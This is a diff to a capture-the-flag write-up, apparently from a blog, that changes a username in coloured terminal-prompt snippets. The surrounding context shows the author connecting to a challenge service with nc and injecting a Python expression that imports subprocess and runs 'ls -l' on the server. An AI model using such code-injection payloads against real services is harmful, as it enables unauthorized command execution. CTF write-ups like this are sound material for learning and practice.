@@ -12,7 +12,7 @@ I first noticed that there is some template injection (? because like we aren't 
 
 
 {% ccb html:true terminal:true %}
-<DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/blahaj<SPAN STYLE="color:#98C379;">]
+<DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/blahaj<SPAN STYLE="color:#98C379;">]
 └─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN> nc 188.166.197.31 30007
 Print what? rwandi
 How many times? 2*2
@@ -28,7 +28,7 @@ __import__("subprocess").call()
 ```
 
 {% ccb html:true terminal:true %}
-<DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/nightmare/Stack_Buffer_Overflow<SPAN STYLE="color:#98C379;">]
+<DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/nightmare/Stack_Buffer_Overflow<SPAN STYLE="color:#98C379;">]
 └─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN> nc 188.166.197.31 30007
 Print what? rwandi
 How many times? <span class="code-highlight">__import__("subprocess").call(["ls","-l"])</span>
